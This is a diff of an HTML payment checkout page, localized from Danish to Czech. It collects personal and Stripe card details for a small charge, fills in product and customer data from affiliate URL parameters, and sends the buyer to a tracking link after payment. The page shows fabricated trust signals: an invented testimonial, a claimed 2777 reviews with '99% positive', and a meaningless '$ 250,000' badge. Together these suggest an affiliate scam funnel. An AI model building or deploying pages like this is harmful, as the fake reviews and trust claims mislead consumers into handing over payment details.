@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="da">
+<html lang="cs">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Sikker betaling - Danmark</title>
+  <title>Zabezpečená platba</title>
   <meta name="referrer" content="no-referrer">
 
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
@@ -15,27 +15,20 @@
   </script>
 
   <style>
-    :root{
-      --bg:#fafafa; --text:#0a2540; --muted:#5b6b82; --line:#e5e7eb;
-    }
+    :root{ --bg:#fafafa; --text:#0a2540; --muted:#5b6b82; --line:#e5e7eb; }
     *{box-sizing:border-box}
     html,body{height:100%}
-    body{
-      margin:0;background:var(--bg);color:var(--text);
-      font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
-    }
+    body{ margin:0;background:var(--bg);color:var(--text); font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; }
 
     .wrap{max-width:1100px;margin:0 auto;padding:18px 14px 60px}
-    .safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px; text-align: center;}
+    .safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px;text-align:center}
 
     .grid{display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:18px}
     @media(max-width:980px){.grid{grid-template-columns:1fr}}
 
     .card{background:#fff;border:1px solid var(--line);padding:22px;border-radius:12px}
 
-    .page-title{
-      font-size:28px;font-weight:900;display:flex;gap:8px;margin:6px 0 14px
-    }
+    .page-title{ font-size:28px;font-weight:900;display:flex;gap:8px;margin:6px 0 14px }
     .stars{color:#f6b80c}
     .reviews{color:#5b6b82;font-size:13px}
 
@@ -45,95 +38,37 @@
     .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
     @media(max-width:620px){.form-grid{grid-template-columns:1fr}}
 
-    .input,.select,.el{
-      width:100%;border:1px solid #cfd6e4;border-radius:10px;
-      padding:12px;font-size:15px;background:#fff
-    }
+    .input,.select,.el{ width:100%;border:1px solid #cfd6e4;border-radius:10px; padding:12px;font-size:15px;background:#fff }
 
-    .btn{
-      width:100%;padding:12px;border:none;border-radius:12px;
-      background:#16a34a;color:#fff;font-weight:900;cursor:pointer
-    }
+    .btn{ width:100%;padding:12px;border:none;border-radius:12px; background:#16a34a;color:#fff;font-weight:900;cursor:pointer }
 
-    .err{
-      display:none;background:#fff1f1;border:1px solid #f5bcbc;
-      padding:10px;border-radius:10px;margin-top:10px;color:#9a1a1a
-    }
+    .err{ display:none;background:#fff1f1;border:1px solid #f5bcbc; padding:10px;border-radius:10px;margin-top:10px;color:#9a1a1a }
     .err[aria-hidden="false"]{display:block}
 
-    .widget{
-      background:#fff;border:1px solid var(--line);
-      padding:16px;border-radius:12px
-    }
+    .widget{ background:#fff;border:1px solid var(--line); padding:16px;border-radius:12px }
     .widget + .widget{margin-top:12px}
 
-    .order-row{
-      display:flex;justify-content:space-between;
-      padding:6px 0;border-top:1px dashed #e6eaf1
-    }
+    .order-row{ display:flex;justify-content:space-between; padding:6px 0;border-top:1px dashed #e6eaf1 }
 
-    .delivery{
-      display:flex;gap:12px;padding:12px;
-      border:1px dashed #d9e2ef;border-radius:10px;background:#f7fbff;
-      align-items:center;
-    }
+    .delivery{ display:flex;gap:12px;padding:12px; border:1px dashed #d9e2ef;border-radius:10px;background:#f7fbff; align-items:center; }
 
-    .trust{
-      display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;text-align:center
-    }
+    .trust{ display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;text-align:center }
     .trust .box{border:1px solid var(--line);padding:8px;border-radius:10px}
 
     .step{display:none}
     .step[aria-hidden="false"]{display:block}
 
-    .hero{
-      display:none;
-      margin-bottom:12px;
-      padding:10px;
-      border:1px solid var(--line);
-      border-radius:12px;
-      gap:10px;
-      align-items:center;
-    }
-    .hero img{
-      width:44px;height:44px;border-radius:10px;
-      border:1px solid var(--line);object-fit:cover
-    }
+    .hero{ display:none; margin-bottom:12px; padding:10px; border:1px solid var(--line); border-radius:12px; gap:10px; align-items:center; }
+    .hero img{ width:44px;height:44px;border-radius:10px; border:1px solid var(--line);object-fit:cover }
 
-    .loading-overlay{
-      position:fixed;inset:0;
-      background:rgba(246,249,252,.92);
-      display:none;align-items:center;justify-content:center;
-      z-index:9999;
-    }
+    .loading-overlay{ position:fixed;inset:0; background:rgba(246,249,252,.92); display:none;align-items:center;justify-content:center; z-index:9999; }
     .loading-overlay[aria-hidden="false"]{display:flex}
 
-    .loading-box{
-      width:min(92vw,460px);
-      background:#fff;
-      border:1px solid #e6edf5;
-      border-radius:14px;
-      padding:24px;
-      text-align:center;
-      box-shadow:0 6px 18px rgba(0,0,0,0.06);
-    }
-    .loading-title{
-      font-size:20px;font-weight:800;margin-bottom:18px
-    }
-    .progress-wrap{
-      width:100%;height:12px;background:#ecf1f8;
-      border-radius:999px;overflow:hidden
-    }
-    .progress-bar{
-      width:0%;height:100%;
-      background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
-      animation:loadingBar 2.2s ease-in-out infinite
-    }
-    @keyframes loadingBar{
-      0%{width:0%}
-      60%{width:80%}
-      100%{width:100%}
-    }
+    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #e6edf5; border-radius:14px; padding:24px; text-align:center; box-shadow:0 6px 18px rgba(0,0,0,0.06); }
+    .loading-title{ font-size:20px;font-weight:800;margin-bottom:18px }
+    .progress-wrap{ width:100%;height:12px;background:#ecf1f8; border-radius:999px;overflow:hidden }
+    .progress-bar{ width:0%;height:100%; background:linear-gradient(90deg,#7aa3ff,#2dd4bf); animation:loadingBar 2.2s ease-in-out infinite }
+    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
   </style>
 </head>
 
@@ -142,15 +77,20 @@
 <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 
 
-<div class="safe">Sikker SSL-betaling</div>
+<script>
+  sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
+</script>
+
+<div class="safe">Zabezpečená platba SSL</div>
 
 <div class="wrap">
   <div class="page-title">
-    Sikker betaling 🔒 <span class="stars">★★★★★</span>
-    <span class="reviews">(2777 anmeldelser)</span>
+    Zabezpečená platba 🔒 <span class="stars">★★★★★</span>
+    <span class="reviews">(2777 recenzí)</span>
   </div>
 
   <div class="grid">
+
     <div class="card">
       <section id="step1" class="step" aria-hidden="false">
         
@@ -158,42 +98,42 @@
           <img id="heroImg" alt="">
           <div>
             <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-            <div class="sub">Produkt fra dit link</div>
+            <div class="sub">Produkt z vašeho odkazu</div>
           </div>
         </div>
 
-        <div class="h2">1. Information</div>
+        <div class="h2">1. Informace</div>
 
         <div class="form-grid">
-          <input id="firstName" class="input" placeholder="Fornavn">
-          <input id="lastName" class="input" placeholder="Efternavn">
+          <input id="firstName" class="input" placeholder="Jméno">
+          <input id="lastName" class="input" placeholder="Příjmení">
         </div>
 
         <div class="form-grid">
-          <input id="billingStreet" class="input" placeholder="Adresse" style="grid-column:1/-1">
-          <input id="billingPostcode" class="input" placeholder="Postnummer">
-          <input id="billingCity" class="input" placeholder="By">
+          <input id="billingStreet" class="input" placeholder="Adresa" style="grid-column:1/-1">
+          <input id="billingPostcode" class="input" placeholder="PSČ">
+          <input id="billingCity" class="input" placeholder="Město">
         </div>
 
         <div class="form-grid">
-          <input id="emailInput" class="input" type="email" placeholder="E-mailadresse">
-          <input class="input" value="Danmark" disabled>
+          <input id="emailInput" class="input" type="email" placeholder="E-mail">
+          <input class="input" value="Česká republika" disabled>
         </div>
 
         <div class="form-grid">
           <select id="phonePrefix" class="select">
-            <option value="+45">+45 — Danmark</option>
+            <option value="+420">+420 — Česko</option>
           </select>
-          <input id="phoneNumber" class="input" placeholder="Telefonnummer">
+          <input id="phoneNumber" class="input" placeholder="Telefonní číslo">
         </div>
 
         <input id="nameInput" type="hidden">
-        <button id="nextBtn" class="btn">Fortsæt</button>
+        <button id="nextBtn" class="btn">Pokračovat</button>
       </section>
 
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. Betaling</div>
-        <p class="sub">Kortoplysninger er krypteret og behandles af Stripe.</p>
+        <div class="h2">2. Platba</div>
+        <p class="sub">Údaje o kartě jsou šifrovány a zpracovávány službou Stripe.</p>
 
         <div>
           <div id="card-number" class="el"></div>
@@ -206,40 +146,40 @@
         <div id="err" class="err" aria-hidden="true"></div>
 
         <div style="display:flex;gap:10px;margin-top:12px">
-          <button id="backBtn" class="btn" style="width:40%">← Tilbage</button>
-          <button id="payNow" class="btn" style="width:60%">Betal sikkert</button>
+          <button id="backBtn" class="btn" style="width:40%">← Zpět</button>
+          <button id="payNow" class="btn" style="width:60%">Zaplatit nyní</button>
         </div>
       </section>
     </div>
 
     <aside>
       <div class="widget">
-        <div style="text-align:center;font-weight:800">Hvad vores kunder siger</div>
+        <div style="text-align:center;font-weight:800">Co říkají naši zákazníci</div>
         <div style="text-align:center;font-weight:700;">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-        <p style="text-align:center">Jeg modtog mit produkt i går. Fantastisk oplevelse!</p>
+        <p style="text-align:center">Produkt mi dorazil včera. Velmi dobrá zkušenost!</p>
       </div>
 
       <div class="widget">
         <div class="delivery">
           <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
           <div>
-            <div id="deliveryText" style="font-weight:800">Hurtig levering</div>
-            <div class="sub">3–5 hverdage</div>
+            <div id="deliveryProductTitle" style="font-weight:800">Rychlé doručení</div>
+            <div class="sub">3–5 pracovních dnů</div>
           </div>
-          <div style="margin-left:auto;font-weight:800">Gratis</div>
+          <div style="margin-left:auto;font-weight:800">Zdarma</div>
         </div>
 
-        <div style="margin-top:14px;font-weight:800">Ordreoversigt</div>
-        <div class="order-row"><span>I alt</span><span>15 kr.</span></div>
+        <div style="margin-top:14px;font-weight:800">Shrnutí objednávky</div>
+        <div class="order-row"><span>Celkem</span><span>45 CZK</span></div>
       </div>
 
       <div class="widget">
-        <div style="font-weight:800;margin-bottom:10px">Hvorfor du kan stole på os</div>
+        <div style="font-weight:800;margin-bottom:10px">Proč nám věřit</div>
         <div class="trust">
-          <div class="box"><div>⭐</div><div>99% positive</div></div>
-          <div class="box"><div>🔒</div><div>SSL-sikret</div></div>
-          <div class="box"><div>🛡️</div><div>EU-kompatibel</div></div>
+          <div class="box"><div>⭐</div><div>99% pozitivní</div></div>
+          <div class="box"><div>🔒</div><div>SSL zabezpečení</div></div>
+          <div class="box"><div>🛡️</div><div>$ 250,000</div></div>
         </div>
       </div>
     </aside>
@@ -248,9 +188,9 @@
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <div class="loading-title">Behandler betaling…</div>
+    <div class="loading-title">Zpracování platby…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p class="sub" style="margin-top:10px">Vent venligst, dette kan tage et par sekunder…</p>
+    <p class="sub" style="margin-top:10px">Prosím čekejte…</p>
   </div>
 </div>
 
@@ -260,14 +200,12 @@ window.addEventListener('DOMContentLoaded', () => {
 
   const qs = new URLSearchParams(window.location.search);
 
-  /* ===== PREFILL & DYNAMIC CONTENT LOGIC (DENMARK) ===== */
+  /* ===== PREFILL & DYNAMIC CONTENT LOGIC ===== */
   try {
     // 1. Title Prefill (sub1)
     const sub1 = qs.get('sub1');
     if (sub1) {
       const title = decodeURIComponent(sub1);
-      
-      // Update Main Page Title
       const pt = document.querySelector('.page-title');
       if (pt) {
         for (const n of pt.childNodes) {
@@ -277,13 +215,9 @@ window.addEventListener('DOMContentLoaded', () => {
           }
         }
       }
-      
-      // Update Hero Title (Step 1)
       const ht = document.getElementById('heroTitle');
       if (ht) ht.textContent = title;
-      
-      // Update Sidebar delivery text
-      const dt = document.getElementById('deliveryText');
+      const dt = document.getElementById('deliveryProductTitle');
       if (dt) dt.textContent = title;
     }
 
@@ -291,16 +225,12 @@ window.addEventListener('DOMContentLoaded', () => {
     const sub2 = qs.get('sub2');
     if (sub2) {
       const imgUrl = decodeURIComponent(sub2);
-      
-      // Update and show Hero image
       const hImg = document.getElementById('heroImg');
-      const hWrap = document.getElementById('hero');
-      if (hImg && hWrap) {
+      const hSection = document.getElementById('hero');
+      if (hImg && hSection) {
         hImg.src = imgUrl;
-        hWrap.style.display = 'flex';
+        hSection.style.display = 'flex';
       }
-      
-      // Update and show Sidebar image
       const sImg = document.getElementById('sidebarImg');
       if (sImg) {
         sImg.src = imgUrl;
@@ -308,7 +238,7 @@ window.addEventListener('DOMContentLoaded', () => {
       }
     }
 
-    // 3. Form Field Prefills
+    // 3. User Data Prefills (sub3-sub10)
     if (qs.get('sub3')) document.getElementById('firstName').value = decodeURIComponent(qs.get('sub3'));
     if (qs.get('sub4')) document.getElementById('lastName').value = decodeURIComponent(qs.get('sub4'));
     if (qs.get('sub5')) document.getElementById('billingStreet').value = decodeURIComponent(qs.get('sub5'));
@@ -317,10 +247,10 @@ window.addEventListener('DOMContentLoaded', () => {
     if (qs.get('sub9')) document.getElementById('emailInput').value = decodeURIComponent(qs.get('sub9'));
     if (qs.get('sub10')) document.getElementById('phoneNumber').value = decodeURIComponent(qs.get('sub10'));
 
-  } catch(e) { console.warn("Prefill failed:", e); }
+  } catch (e) { console.error("Prefill error:", e); }
   /* ===== END PREFILL LOGIC ===== */
 
-  const stripe = Stripe("pk_live_51SxKzcEAzUPDRpk_live_51TDhYVIid7YimWFZbhI8Rid39d1CVQbAN6rq1j2HdiiFdHWDwDliFKD2fp2IzcJfAbSWkFCewMBTB2k3H8EpFhtV00rA7MeVwe");
+  const stripe = Stripe("pk_live_51TDhYVIid7YimWFZbhI8Rid39d1CVQbAN6rq1j2HdiiFdHWDwDliFKD2fp2IzcJfAbSWkFCewMBTB2k3H8EpFhtV00rA7MeVwe");
   const elements = stripe.elements();
 
   const cardNumber = elements.create('cardNumber');
@@ -345,7 +275,8 @@ window.addEventListener('DOMContentLoaded', () => {
   payNow.onclick = async () => {
     payNow.disabled = true;
     err.setAttribute("aria-hidden","true");
-    document.getElementById("loading-overlay").setAttribute("aria-hidden","false");
+    const overlay = document.getElementById("loading-overlay");
+    overlay.setAttribute("aria-hidden","false");
 
     const billingDetails = {
       name: nameInput.value,
@@ -355,7 +286,7 @@ window.addEventListener('DOMContentLoaded', () => {
         line1: billingStreet.value,
         city: billingCity.value,
         postal_code: billingPostcode.value,
-        country: "DK"
+        country: "CZ"
       }
     };
 
@@ -367,26 +298,28 @@ window.addEventListener('DOMContentLoaded', () => {
       });
       if (pm.error) throw pm.error;
 
-      const r = await fetch("/api/stripe/s6/one-time-33-95",{
+      const r = await fetch("/api/stripe/s6/one-time-29-95",{
         method:"POST",
         headers:{ "Content-Type":"application/json" },
-        body:JSON.stringify({ paymentMethodId: pm.paymentMethod.id, billingDetails })\
+        body:JSON.stringify({ paymentMethodId: pm.paymentMethod.id, billingDetails })
       });
 
       const d = await r.json();
       const c = await stripe.confirmCardPayment(d.clientSecret,{ payment_method: pm.paymentMethod.id });
 
       if (c.error) throw c.error;
-      window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
+
+      window.location.href = "https://cudsr.bemobtrcks.com/go/6b6e67d8-fe22-4816-8318-ef7cf7685f83";
 
     } catch(e){
       err.textContent = e.message;
       err.setAttribute("aria-hidden","false");
       payNow.disabled = false;
-      document.getElementById("loading-overlay").setAttribute("aria-hidden","true");
+      overlay.setAttribute("aria-hidden","true");
     }
   };
 });
 </script>
+
 </body>
 </html>
